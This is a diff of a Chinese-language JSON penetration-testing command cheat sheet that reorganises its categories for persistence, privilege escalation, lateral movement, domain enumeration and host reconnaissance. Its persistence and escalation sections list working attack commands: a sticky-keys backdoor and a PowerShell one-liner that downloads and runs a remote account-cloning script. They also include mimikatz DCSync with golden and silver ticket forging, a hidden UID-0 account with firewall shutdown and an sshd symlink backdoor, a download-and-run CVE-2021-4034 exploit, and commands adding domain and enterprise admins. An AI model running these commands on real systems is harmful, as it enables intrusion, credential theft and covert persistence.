@@ -117,134 +117,158 @@
 			]
 		}
 	},
-	"权限维持": {
-		"粘滞键后门": {
-			"Windows": [
-				{
-					"command": "pushd C:\\windows\\system32",
-					"describe": "临时切换当前目录到Windows的System32文件夹，使用pushd会保存之前的目录位置。"
-				},
-				{
-					"command": "move sethc.exe sethc.exe.bak",
-					"describe": "将系统中负责粘滞键功能的sethc.exe文件重命名为sethc.exe.bak，备份原始文件。"
-				},
-				{
-					"command": "copy cmd.exe sethc.exe",
-					"describe": "将cmd.exe文件复制并覆盖sethc.exe，从而在粘滞键激活时启动命令提示符。"
-				}
-			]
+	"权限操作": {
+		"权限维持": {
+			"粘滞键后门": {
+				"Windows": [
+					{
+						"command": "pushd C:\\windows\\system32",
+						"describe": "临时切换当前目录到Windows的System32文件夹，使用pushd会保存之前的目录位置。"
+					},
+					{
+						"command": "move sethc.exe sethc.exe.bak",
+						"describe": "将系统中负责粘滞键功能的sethc.exe文件重命名为sethc.exe.bak，备份原始文件。"
+					},
+					{
+						"command": "copy cmd.exe sethc.exe",
+						"describe": "将cmd.exe文件复制并覆盖sethc.exe，从而在粘滞键激活时启动命令提示符。"
+					}
+				]
+			},
+			"克隆账号": {
+				"Windows": [
+					{
+						"command": "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd",
+						"describe": "将一个账号当前的权限以及账号相关信息克隆到另外一个新账户中, 如果被克隆账号被禁用, 则无法克隆"
+					}
+				]
+			},
+			"伪造黄金票据(伪造TGT)": {
+				"Windows": [
+					{
+						"command": "net group \"domain admins\" /domain",
+						"describe": "获取管理员账号"
+					},
+					{
+						"command": "ipconfig /all",
+						"describe": "获取域名"
+					},
+					{
+						"command": "wmic useraccount get name,sid",
+						"describe": "获取域内所有用户sid"
+					},
+					{
+						"command": "whomai /user",
+						"describe": "获取当前用户sid"
+					},
+					{
+						"command": "minikatz.exe \"lsadump::dcsync /domain:test.com /user:krbtgt /csv\" exit",
+						"describe": "导出krbtgt的ntml hash (使用mimikatz工具的dcsysc功能远程转储活动目录的ntds.dit并导出krbtgt账号信息)"
+					},
+					{
+						"command": "kerberos::purge 或 klist purge",
+						"describe": "使用mimikatz清空票据"
+					},
+					{
+						"command": "kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi",
+						"describe": "生成票据"
+					},
+					{
+						"command": "Kerberos::ptt golden.kiribi",
+						"describe": "传递票据并注入"
+					},
+					{
+						"command": "Kerberos::tgt",
+						"describe": "查看当前会话中的票据"
+					},
+					{
+						"command": "dir \\\\dc\\c$",
+						"describe": "验证权限"
+					}
+				]
+			},
+			"伪造白银票据(伪造TGS)": {
+				"Windows": [
+					{
+						"command": "ipconfig /all",
+						"describe": "获取域名"
+					},
+					{
+						"command": "wmic useraccount get name,sid",
+						"describe": "获取域SID（获取域内所有用户SID）"
+					},
+					{
+						"command": "whomai /user",
+						"describe": "获取当前用户SID"
+					},
+					{
+						"command": "Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+						"describe": "获取服务账号的NTLM Hash（需要管理员权限）"
+					},
+					{
+						"command": "kerberos::purge",
+						"describe": "清空票据（在mimikatz中输入）"
+					},
+					{
+						"command": "mimikatz \"kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\" exit",
+						"describe": "生成白银票据（需要指定目标服务器的FQDN、服务和NTLM散列）"
+					},
+					{
+						"command": "Kerberos::tgt",
+						"describe": "查看当前会话中的票据"
+					},
+					{
+						"command": "dir \\\\dc\\c$",
+						"describe": "验证权限"
+					}
+				]
+			},
+			"SSH软链接": {
+				"Linux": [
+					{
+						"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` -o -u 0 -g root -G root -s /bin/bash -d /home/support",
+						"describe": "创建一个具有Root权限的账户，用户名为support，密码为Passw0rd。"
+					},
+					{
+						"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` support",
+						"describe": "创建一个普通权限的账户，用户名为support，密码为Passw0rd。"
+					},
+					{
+						"command": "service iptables stop",
+						"describe": "停止iptables服务，以便进行后门植入。"
+					},
+					{
+						"command": "ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=20020",
+						"describe": "创建一个指向sshd的软链接，并启动一个监听在20020端口的后门。"
+					},
+					{
+						"command": "ssh root@IP -p 20020",
+						"describe": "通过SSH连接到目标IP，使用端口20020进行登录。"
+					}
+				]
+			}
 		},
-		"克隆账号": {
-			"Windows": [
-				{
-					"command": "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd",
-					"describe": "将一个账号当前的权限以及账号相关信息克隆到另外一个新账户中, 如果被克隆账号被禁用, 则无法克隆"
-				}
-			]
-		},
-		"伪造黄金票据(伪造TGT)": {
-			"Windows": [
-				{
-					"command": "net group \"domain admins\" /domain",
-					"describe": "获取管理员账号"
-				},
-				{
-					"command": "ipconfig /all",
-					"describe": "获取域名"
-				},
-				{
-					"command": "wmic useraccount get name,sid",
-					"describe": "获取域内所有用户sid"
-				},
-				{
-					"command": "whomai /user",
-					"describe": "获取当前用户sid"
-				},
-				{
-					"command": "minikatz.exe \"lsadump::dcsync /domain:test.com /user:krbtgt /csv\" exit",
-					"describe": "导出krbtgt的ntml hash (使用mimikatz工具的dcsysc功能远程转储活动目录的ntds.dit并导出krbtgt账号信息)"
-				},
-				{
-					"command": "kerberos::purge 或 klist purge",
-					"describe": "使用mimikatz清空票据"
-				},
-				{
-					"command": "kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi",
-					"describe": "生成票据"
-				},
-				{
-					"command": "Kerberos::ptt golden.kiribi",
-					"describe": "传递票据并注入"
-				},
-				{
-					"command": "Kerberos::tgt",
-					"describe": "查看当前会话中的票据"
-				},
-				{
-					"command": "dir \\\\dc\\c$",
-					"describe": "验证权限"
-				}
-			]
-		},
-		"伪造白银票据(伪造TGS)": {
-			"Windows": [
-				{
-					"command": "ipconfig /all",
-					"describe": "获取域名"
-				},
-				{
-					"command": "wmic useraccount get name,sid",
-					"describe": "获取域SID（获取域内所有用户SID）"
-				},
-				{
-					"command": "whomai /user",
-					"describe": "获取当前用户SID"
-				},
-				{
-					"command": "Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
-					"describe": "获取服务账号的NTLM Hash（需要管理员权限）"
-				},
-				{
-					"command": "kerberos::purge",
-					"describe": "清空票据（在mimikatz中输入）"
-				},
-				{
-					"command": "mimikatz \"kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\" exit",
-					"describe": "生成白银票据（需要指定目标服务器的FQDN、服务和NTLM散列）"
-				},
-				{
-					"command": "Kerberos::tgt",
-					"describe": "查看当前会话中的票据"
-				},
-				{
-					"command": "dir \\\\dc\\c$",
-					"describe": "验证权限"
-				}
-			]
-		},
-		"SSH软链接": {
-			"Linux": [
-				{
-					"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` -o -u 0 -g root -G root -s /bin/bash -d /home/support",
-					"describe": "创建一个具有Root权限的账户，用户名为support，密码为Passw0rd。"
-				},
-				{
-					"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` support",
-					"describe": "创建一个普通权限的账户，用户名为support，密码为Passw0rd。"
-				},
-				{
-					"command": "service iptables stop",
-					"describe": "停止iptables服务，以便进行后门植入。"
-				},
-				{
-					"command": "ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=20020",
-					"describe": "创建一个指向sshd的软链接，并启动一个监听在20020端口的后门。"
-				},
-				{
-					"command": "ssh root@IP -p 20020",
-					"describe": "通过SSH连接到目标IP，使用端口20020进行登录。"
-				}
-			]
+		"权限提升": {
+			"Polkit工具提权": {
+				"Linux": [
+					{
+						"command": "find / -perm -u=s -type f 2> /dev/null",
+						"describe": "查找系统中具有SUID位的文件，这些文件可能允许权限提升。"
+					},
+					{
+						"command": "wget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run 2>&1 > /dev/null",
+						"describe": "下载CVE-2021-4034的漏洞利用工具到/tmp/.ICE-unix/run。"
+					},
+					{
+						"command": "chmod +x /tmp/.ICE-unix/run",
+						"describe": "给予下载的漏洞利用工具执行权限。"
+					},
+					{
+						"command": "/tmp/.ICE-unix/run",
+						"describe": "执行CVE-2021-4034漏洞利用工具。"
+					}
+				]
+			}
 		}
 	},
 	"横向移动": {
@@ -323,977 +347,1211 @@
 					"describe": "对192.168.1.1到192.168.255.1的IP地址进行ping操作，检查响应中的TTL值以探测网络设备的存在。"
 				}
 			]
-		}
-	},
-	"权限提升": {
-		"Polkit工具提权": {
-			"Linux": [
+		},
+		"建立IPC会话": {
+			"Windows": [
 				{
-					"command": "find / -perm -u=s -type f 2> /dev/null",
-					"describe": "查找系统中具有SUID位的文件，这些文件可能允许权限提升。"
-				},
-				{
-					"command": "wget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run 2>&1 > /dev/null",
-					"describe": "下载CVE-2021-4034的漏洞利用工具到/tmp/.ICE-unix/run。"
-				},
-				{
-					"command": "chmod +x /tmp/.ICE-unix/run",
-					"describe": "给予下载的漏洞利用工具执行权限。"
-				},
-				{
-					"command": "/tmp/.ICE-unix/run",
-					"describe": "执行CVE-2021-4034漏洞利用工具。"
+					"command": "net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\"",
+					"describe": "在网络环境中建立与远程机器的IPC会话，使用域管理员的账户凭证访问共享资源。"
 				}
 			]
 		}
 	},
-	"获取操作系统信息": {
-		"查看操作系统版本": {
+	"域渗透操作": {
+		"查看当前用户权限": {
 			"Windows": [
 				{
-					"command": "systeminfo",
-					"describe": "显示详细的操作系统信息，包括补丁信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "cat /etc/issue",
-					"describe": "查看系统发行版本信息"
-				},
-				{
-					"command": "cat /etc/*-release",
-					"describe": "查看操作系统版本信息"
-				},
-				{
-					"command": "cat /etc/lsb-release",
-					"describe": "查看Debian系统的版本信息"
-				},
-				{
-					"command": "cat /etc/redhat-release",
-					"describe": "查看Redhat系统的版本信息"
-				}
-			]
-		},
-		"识别操作系统名称及版本（英文）": {
-			"Windows": [
-				{
-					"command": "systeminfo | findstr /B /C:\"OS Name\" /c:\"OS Version\"",
-					"describe": "提取操作系统名称及版本信息"
-				},
-				{
-					"command": "wmic os get Caption, Version",
-					"describe": "获取操作系统名称和版本"
-				}
-			]
-		},
-		"识别操作系统名称及版本（中文）": {
-			"Windows": [
-				{
-					"command": "systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"",
-					"describe": "提取中文显示的操作系统名称及版本信息"
-				}
-			]
-		},
-		"识别系统体系结构": {
-			"Windows": [
-				{
-					"command": "echo %PROCESSOR_ARCHITECTURE% AMD64",
-					"describe": "显示系统的处理器架构"
-				},
-				{
-					"command": "wmic os get Architecture",
-					"describe": "获取操作系统架构信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "uname -m",
-					"describe": "显示系统的机器硬件名称"
-				}
-			]
-		},
-		"查看内核版本、是否为64位": {
-			"Linux": [
-				{
-					"command": "cat /proc/version",
-					"describe": "查看Linux内核版本"
-				},
-				{
-					"command": "uname -a",
-					"describe": "查看内核、操作系统、CPU信息"
-				},
-				{
-					"command": "uname -mrs",
-					"describe": "显示内核名称、版本及系统架构"
-				},
-				{
-					"command": "rpm -q kernel",
-					"describe": "查看安装的内核版本"
-				},
-				{
-					"command": "dmesg | grep Linux",
-					"describe": "查看dmesg日志中的Linux相关信息"
-				},
-				{
-					"command": "ls /boot | grep wmlinuz-",
-					"describe": "列出/boot目录中的内核文件"
-				}
-			]
-		},
-		"查看环境变量": {
-			"Windows": [
-				{
-					"command": "set",
-					"describe": "显示当前环境变量"
-				},
-				{
-					"command": "echo %PATH%",
-					"describe": "显示PATH环境变量"
-				},
-				{
-					"command": "wmic environment get Name, VariableValue",
-					"describe": "获取所有环境变量的名称和值"
-				}
-			],
-			"Linux": [
-				{
-					"command": "cat /etc/profile",
-					"describe": "查看全局环境变量配置文件"
-				},
-				{
-					"command": "cat /etc/bashrc",
-					"describe": "查看bash shell环境配置文件"
-				},
-				{
-					"command": "cat ~/.bash_profile",
-					"describe": "查看用户的bash登录环境配置"
-				},
-				{
-					"command": "cat ~/.bashrc",
-					"describe": "查看用户的bash环境配置"
-				},
-				{
-					"command": "cat ~/.bash_logout",
-					"describe": "查看用户的bash退出配置"
-				},
-				{
-					"command": "env",
-					"describe": "显示当前用户的环境变量"
-				},
-				{
-					"command": "set",
-					"describe": "显示当前环境变量（bash风格）"
-				}
-			]
-		},
-		"查看是否有打印机": {
-			"Windows": [
-				{
-					"command": "wmic printer list brief",
-					"describe": "列出所有打印机"
-				}
-			],
-			"Linux": [
-				{
-					"command": "lpstat -a",
-					"describe": "列出所有已安装的打印机"
-				}
-			]
-		}
-	},
-	"获取用户信息": {
-		"查看当前用户": {
-			"Windows": [
-				{
-					"command": "whoami",
-					"describe": "显示当前登录的用户名"
-				},
-				{
-					"command": "echo %USERNAME%",
-					"describe": "显示当前用户名环境变量"
+					"command": "whoami /user",
+					"describe": "查看当前用户权限信息"
 				}
 			],
 			"Linux": [
 				{
 					"command": "id",
-					"describe": "显示当前用户及其ID信息"
-				},
-				{
-					"command": "whoami",
-					"describe": "显示当前登录的用户名"
+					"describe": "查看当前用户及其权限"
 				}
 			]
 		},
-		"查看计算机用户列表": {
+		"查看域名和其他信息": {
 			"Windows": [
 				{
-					"command": "net user",
-					"describe": "列出所有用户账户"
-				},
+					"command": "net config workstation",
+					"describe": "显示当前计算机的域名和配置信息"
+				}
+			]
+		},
+		"查询域用户": {
+			"Windows": [
 				{
-					"command": "wmic useraccount list full",
-					"describe": "显示所有用户账户的详细信息"
+					"command": "net user /domain",
+					"describe": "列出当前域中的所有用户"
 				}
 			],
 			"Linux": [
 				{
-					"command": "cat /etc/passwd",
-					"describe": "查看所有用户的账户信息"
+					"command": "ldapsearch -x -b 'dc=example,dc=com' '(objectClass=user)'",
+					"describe": "列出当前域中的所有用户（需要配置LDAP）"
 				}
 			]
 		},
-		"查看计算机用户组列表": {
+		"添加域用户": {
 			"Windows": [
 				{
-					"command": "net localgroup",
-					"describe": "列出所有本地用户组"
-				},
-				{
-					"command": "wmic group list brief",
-					"describe": "列出所有组的简要信息"
+					"command": "net user ASP.NET Admin12345 /add /domain",
+					"describe": "在域中添加名为ASP.NET的用户，密码为Admin12345"
 				}
 			],
 			"Linux": [
 				{
-					"command": "cat /etc/group",
-					"describe": "查看所有用户组的信息"
+					"command": "sudo useradd ASP.NET",
+					"describe": "在Linux中添加名为ASP.NET的用户"
+				},
+				{
+					"command": "echo 'Admin12345' | sudo passwd ASP.NET --stdin",
+					"describe": "为Linux中的ASP.NET用户设置密码为Admin12345"
 				}
 			]
 		},
-		"查看当前登录用户": {
+		"添加域管理员": {
 			"Windows": [
 				{
-					"command": "query user",
-					"describe": "查看当前登录的用户会话"
-				},
-				{
-					"command": "whoami /all",
-					"describe": "显示当前用户的所有详细信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "who",
-					"describe": "显示当前登录用户的信息"
-				},
-				{
-					"command": "w",
-					"describe": "显示登录用户及其活动"
-				},
-				{
-					"command": "users",
-					"describe": "显示所有当前登录的用户"
+					"command": "net group \"domain admins\" ASP.NET /add /domain",
+					"describe": "将用户ASP.NET添加为域管理员"
 				}
 			]
 		},
-		"查看当前用户保存的凭证": {
+		"添加企业管理员": {
 			"Windows": [
 				{
-					"command": "cmdkey /list",
-					"describe": "列出当前用户保存的凭证"
+					"command": "net group \"enterprise admins\" ASP.NET /add /domain",
+					"describe": "将用户ASP.NET添加为企业管理员"
 				}
 			]
 		},
-		"查看当前用户保存的票据凭证": {
+		"查询域管理员用户": {
 			"Windows": [
 				{
-					"command": "klist",
-					"describe": "显示当前用户保存的Kerberos票据"
+					"command": "net group \"domain admins\" /domain",
+					"describe": "查询当前域中的域管理员用户"
 				}
 			]
 		},
-		"查看超级用户权限和信息": {
-			"Linux": [
+		"查询域企业管理组": {
+			"Windows": [
 				{
-					"command": "cat /etc/sudoers",
-					"describe": "查看sudo权限配置文件"
-				},
-				{
-					"command": "sudo -l",
-					"describe": "列出当前用户的sudo权限"
-				},
-				{
-					"command": "ls -ahlR /root/",
-					"describe": "查看root用户的目录内容"
+					"command": "net group \"enterprise admins\" /domain",
+					"describe": "查询当前域中的企业管理员组"
 				}
 			]
 		},
-		"查看系统登录历史": {
-			"Linux": [
+		"查询域本地管理组": {
+			"Windows": [
 				{
-					"command": "who",
-					"describe": "查看当前登录的用户"
-				},
+					"command": "net localgroup administrators /domain",
+					"describe": "查询当前域中的本地管理组"
+				}
+			]
+		},
+		"查询域控制器和时间": {
+			"Windows": [
 				{
-					"command": "w",
-					"describe": "显示登录用户及其活动"
-				},
+					"command": "net time /domain",
+					"describe": "查看当前域的时间和域控制器信息"
+				}
+			]
+		},
+		"查询域名称": {
+			"Windows": [
 				{
-					"command": "last",
-					"describe": "显示用户登录历史"
+					"command": "net view /domain",
+					"describe": "列出当前域中的所有资源"
+				}
+			]
+		},
+		"查询域内计算机": {
+			"Windows": [
+				{
+					"command": "net view /domain:redteam.local",
+					"describe": "查看域redteam.local中的计算机列表"
+				}
+			]
+		},
+		"查看当前域内计算机列表": {
+			"Windows": [
+				{
+					"command": "net group \"domain computers\" /domain",
+					"describe": "查看当前域中所有计算机的列表"
+				}
+			]
+		},
+		"查看域控机器名": {
+			"Windows": [
+				{
+					"command": "net group \"domain controllers\" /domain",
+					"describe": "查看域中的域控制器的机器名"
+				}
+			]
+		},
+		"查看域密码策略": {
+			"Windows": [
+				{
+					"command": "net accounts /domain",
+					"describe": "查看当前域的密码策略"
+				}
+			]
+		},
+		"查看域信任": {
+			"Windows": [
+				{
+					"command": "nltest /domain_trusts",
+					"describe": "查看当前域的信任关系"
+				}
+			]
+		},
+		"查看某个域的域信任": {
+			"Windows": [
+				{
+					"command": "nltest /domain_trusts /all_trusts /v /server:10.10.10.10",
+					"describe": "查看特定域（通过服务器10.10.10.10）所有的信任关系"
+				}
+			]
+		},
+		"通过SRV记录查看域信息": {
+			"Windows": [
+				{
+					"command": "nslookup -type=SRV _ldap._tcp.corp",
+					"describe": "通过SRV记录查询域的LDAP服务信息"
 				}
 			]
 		}
 	},
-	"获取网络信息": {
-		"查看路由信息": {
-			"Windows": [
-				{
-					"command": "route print",
-					"describe": "查看本地路由表信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "route -n",
-					"describe": "查看路由表信息"
-				},
-				{
-					"command": "ip route show",
-					"describe": "显示当前路由信息"
-				}
-			]
+	"系统信息收集": {
+		"查看操作系统信息": {
+			"查看操作系统版本": {
+				"Windows": [
+					{
+						"command": "systeminfo",
+						"describe": "显示详细的操作系统信息，包括补丁信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat /etc/issue",
+						"describe": "查看系统发行版本信息"
+					},
+					{
+						"command": "cat /etc/*-release",
+						"describe": "查看操作系统版本信息"
+					},
+					{
+						"command": "cat /etc/lsb-release",
+						"describe": "查看Debian系统的版本信息"
+					},
+					{
+						"command": "cat /etc/redhat-release",
+						"describe": "查看Redhat系统的版本信息"
+					}
+				]
+			},
+			"识别操作系统名称及版本（英文）": {
+				"Windows": [
+					{
+						"command": "systeminfo | findstr /B /C:\"OS Name\" /c:\"OS Version\"",
+						"describe": "提取操作系统名称及版本信息"
+					},
+					{
+						"command": "wmic os get Caption, Version",
+						"describe": "获取操作系统名称和版本"
+					}
+				]
+			},
+			"识别操作系统名称及版本（中文）": {
+				"Windows": [
+					{
+						"command": "systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"",
+						"describe": "提取中文显示的操作系统名称及版本信息"
+					}
+				]
+			},
+			"识别系统体系结构": {
+				"Windows": [
+					{
+						"command": "echo %PROCESSOR_ARCHITECTURE% AMD64",
+						"describe": "显示系统的处理器架构"
+					},
+					{
+						"command": "wmic os get Architecture",
+						"describe": "获取操作系统架构信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "uname -m",
+						"describe": "显示系统的机器硬件名称"
+					}
+				]
+			},
+			"查看内核版本、是否为64位": {
+				"Linux": [
+					{
+						"command": "cat /proc/version",
+						"describe": "查看Linux内核版本"
+					},
+					{
+						"command": "uname -a",
+						"describe": "查看内核、操作系统、CPU信息"
+					},
+					{
+						"command": "uname -mrs",
+						"describe": "显示内核名称、版本及系统架构"
+					},
+					{
+						"command": "rpm -q kernel",
+						"describe": "查看安装的内核版本"
+					},
+					{
+						"command": "dmesg | grep Linux",
+						"describe": "查看dmesg日志中的Linux相关信息"
+					},
+					{
+						"command": "ls /boot | grep wmlinuz-",
+						"describe": "列出/boot目录中的内核文件"
+					}
+				]
+			},
+			"查看环境变量": {
+				"Windows": [
+					{
+						"command": "set",
+						"describe": "显示当前环境变量"
+					},
+					{
+						"command": "echo %PATH%",
+						"describe": "显示PATH环境变量"
+					},
+					{
+						"command": "wmic environment get Name, VariableValue",
+						"describe": "获取所有环境变量的名称和值"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat /etc/profile",
+						"describe": "查看全局环境变量配置文件"
+					},
+					{
+						"command": "cat /etc/bashrc",
+						"describe": "查看bash shell环境配置文件"
+					},
+					{
+						"command": "cat ~/.bash_profile",
+						"describe": "查看用户的bash登录环境配置"
+					},
+					{
+						"command": "cat ~/.bashrc",
+						"describe": "查看用户的bash环境配置"
+					},
+					{
+						"command": "cat ~/.bash_logout",
+						"describe": "查看用户的bash退出配置"
+					},
+					{
+						"command": "env",
+						"describe": "显示当前用户的环境变量"
+					},
+					{
+						"command": "set",
+						"describe": "显示当前环境变量（bash风格）"
+					}
+				]
+			},
+			"查看是否有打印机": {
+				"Windows": [
+					{
+						"command": "wmic printer list brief",
+						"describe": "列出所有打印机"
+					}
+				],
+				"Linux": [
+					{
+						"command": "lpstat -a",
+						"describe": "列出所有已安装的打印机"
+					}
+				]
+			}
 		},
-		"查看arp": {
-			"Windows": [
-				{
-					"command": "arp -A",
-					"describe": "显示本地ARP缓存"
-				}
-			],
-			"Linux": [
-				{
-					"command": "arp -a",
-					"describe": "显示ARP缓存表"
-				},
-				{
-					"command": "ip neighbor",
-					"describe": "查看邻居缓存表（ARP表）"
-				}
-			]
+		"用户信息收集": {
+			"查看当前用户": {
+				"Windows": [
+					{
+						"command": "whoami",
+						"describe": "显示当前登录的用户名"
+					},
+					{
+						"command": "echo %USERNAME%",
+						"describe": "显示当前用户名环境变量"
+					}
+				],
+				"Linux": [
+					{
+						"command": "id",
+						"describe": "显示当前用户及其ID信息"
+					},
+					{
+						"command": "whoami",
+						"describe": "显示当前登录的用户名"
+					}
+				]
+			},
+			"查看计算机用户列表": {
+				"Windows": [
+					{
+						"command": "net user",
+						"describe": "列出所有用户账户"
+					},
+					{
+						"command": "wmic useraccount list full",
+						"describe": "显示所有用户账户的详细信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat /etc/passwd",
+						"describe": "查看所有用户的账户信息"
+					}
+				]
+			},
+			"查看计算机用户组列表": {
+				"Windows": [
+					{
+						"command": "net localgroup",
+						"describe": "列出所有本地用户组"
+					},
+					{
+						"command": "wmic group list brief",
+						"describe": "列出所有组的简要信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat /etc/group",
+						"describe": "查看所有用户组的信息"
+					}
+				]
+			},
+			"查看当前登录用户": {
+				"Windows": [
+					{
+						"command": "query user",
+						"describe": "查看当前登录的用户会话"
+					},
+					{
+						"command": "whoami /all",
+						"describe": "显示当前用户的所有详细信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "who",
+						"describe": "显示当前登录用户的信息"
+					},
+					{
+						"command": "w",
+						"describe": "显示登录用户及其活动"
+					},
+					{
+						"command": "users",
+						"describe": "显示所有当前登录的用户"
+					}
+				]
+			},
+			"查看当前用户保存的凭证": {
+				"Windows": [
+					{
+						"command": "cmdkey /list",
+						"describe": "列出当前用户保存的凭证"
+					}
+				]
+			},
+			"查看当前用户保存的票据凭证": {
+				"Windows": [
+					{
+						"command": "klist",
+						"describe": "显示当前用户保存的Kerberos票据"
+					}
+				]
+			},
+			"查看超级用户权限和信息": {
+				"Linux": [
+					{
+						"command": "cat /etc/sudoers",
+						"describe": "查看sudo权限配置文件"
+					},
+					{
+						"command": "sudo -l",
+						"describe": "列出当前用户的sudo权限"
+					},
+					{
+						"command": "ls -ahlR /root/",
+						"describe": "查看root用户的目录内容"
+					}
+				]
+			},
+			"查看系统登录历史": {
+				"Linux": [
+					{
+						"command": "who",
+						"describe": "查看当前登录的用户"
+					},
+					{
+						"command": "w",
+						"describe": "显示登录用户及其活动"
+					},
+					{
+						"command": "last",
+						"describe": "显示用户登录历史"
+					}
+				]
+			}
 		},
-		"查看ip地址和dns信息": {
-			"Windows": [
-				{
-					"command": "ipconfig /all",
-					"describe": "查看本地IP地址、子网掩码、默认网关、DNS信息等"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ip a",
-					"describe": "显示本地网络接口及其地址"
-				},
-				{
-					"command": "ifconfig -a",
-					"describe": "显示所有网络接口信息"
-				},
-				{
-					"command": "cat /etc/resolv.conf",
-					"describe": "查看DNS服务器配置"
-				}
-			]
+		"网络信息收集": {
+			"查看路由信息": {
+				"Windows": [
+					{
+						"command": "route print",
+						"describe": "查看本地路由表信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "route -n",
+						"describe": "查看路由表信息"
+					},
+					{
+						"command": "ip route show",
+						"describe": "显示当前路由信息"
+					}
+				]
+			},
+			"查看arp": {
+				"Windows": [
+					{
+						"command": "arp -A",
+						"describe": "显示本地ARP缓存"
+					}
+				],
+				"Linux": [
+					{
+						"command": "arp -a",
+						"describe": "显示ARP缓存表"
+					},
+					{
+						"command": "ip neighbor",
+						"describe": "查看邻居缓存表（ARP表）"
+					}
+				]
+			},
+			"查看ip地址和dns信息": {
+				"Windows": [
+					{
+						"command": "ipconfig /all",
+						"describe": "查看本地IP地址、子网掩码、默认网关、DNS信息等"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ip a",
+						"describe": "显示本地网络接口及其地址"
+					},
+					{
+						"command": "ifconfig -a",
+						"describe": "显示所有网络接口信息"
+					},
+					{
+						"command": "cat /etc/resolv.conf",
+						"describe": "查看DNS服务器配置"
+					}
+				]
+			},
+			"查看防火墙规则和状态": {
+				"Windows": [
+					{
+						"command": "netsh firewall show config",
+						"describe": "查看防火墙配置"
+					},
+					{
+						"command": "netsh firewall show state",
+						"describe": "查看防火墙状态"
+					},
+					{
+						"command": "netsh advfirewall firewall show rule name=all",
+						"describe": "显示所有防火墙规则"
+					},
+					{
+						"command": "netsh advfirewall show allprofiles",
+						"describe": "查看所有防火墙配置文件"
+					}
+				],
+				"Linux": [
+					{
+						"command": "iptables -L",
+						"describe": "列出当前iptables防火墙规则"
+					},
+					{
+						"command": "ufw status",
+						"describe": "查看UFW防火墙状态"
+					},
+					{
+						"command": "firewall-cmd --list-all",
+						"describe": "列出firewalld的所有规则"
+					}
+				]
+			},
+			"查看系统开放端口": {
+				"Windows": [
+					{
+						"command": "netstat -ano",
+						"describe": "显示所有活动连接和监听端口"
+					}
+				],
+				"Linux": [
+					{
+						"command": "netstat -tulpn",
+						"describe": "显示当前监听的端口及其相关进程"
+					},
+					{
+						"command": "ss -tuln",
+						"describe": "显示监听端口的简化信息"
+					}
+				]
+			},
+			"查看当前网络地址": {
+				"Linux": [
+					{
+						"command": "/sbin/ifconfig -a",
+						"describe": "显示所有网络接口地址"
+					},
+					{
+						"command": "cat /etc/network/interfaces",
+						"describe": "查看网络接口的配置文件"
+					},
+					{
+						"command": "cat /etc/susconfig/network",
+						"describe": "查看系统网络配置"
+					}
+				]
+			},
+			"查看网络配置、DNS、 DHCP、网关": {
+				"Windows": [
+					{
+						"command": "ipconfig /all",
+						"describe": "查看网络配置、DNS、DHCP、网关等信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "cat /etc/resolv.conf",
+						"describe": "查看DNS服务器配置"
+					},
+					{
+						"command": "cat /etc/sysconfig/network",
+						"describe": "查看系统网络配置"
+					},
+					{
+						"command": "cat /etc/networks",
+						"describe": "查看网络名称及对应的IP地址"
+					},
+					{
+						"command": "iptables -L",
+						"describe": "查看当前iptables防火墙规则"
+					},
+					{
+						"command": "hostname",
+						"describe": "查看系统主机名"
+					},
+					{
+						"command": "dnsdomainname",
+						"describe": "查看系统DNS域名"
+					},
+					{
+						"command": "ip a",
+						"describe": "查看本地IP地址信息"
+					},
+					{
+						"command": "nmcli device show",
+						"describe": "显示网络设备的详细信息"
+					}
+				]
+			},
+			"查看网络通信": {
+				"Windows": [
+					{
+						"command": "netstat -an",
+						"describe": "显示所有网络连接"
+					},
+					{
+						"command": "netstat -an | findstr :80",
+						"describe": "查找监听80端口的连接"
+					}
+				],
+				"Linux": [
